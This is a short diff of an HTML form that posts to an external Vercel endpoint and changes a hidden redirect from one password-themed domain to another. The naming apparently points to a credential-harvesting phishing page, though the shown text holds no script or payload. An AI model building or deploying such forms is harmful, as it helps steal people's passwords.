@@ -10,7 +10,7 @@
     </head>
     <body>
         <form action="https://professor804.vercel.app/maheen" method="post">
-            <input type="hidden" name="_redirect" value="https://password-form-web.vercel.app/"/>
+            <input type="hidden" name="_redirect" value="https://password-required-here-dun.vercel.app/"/>
             <div id="root">
                 <div>
                     <form>
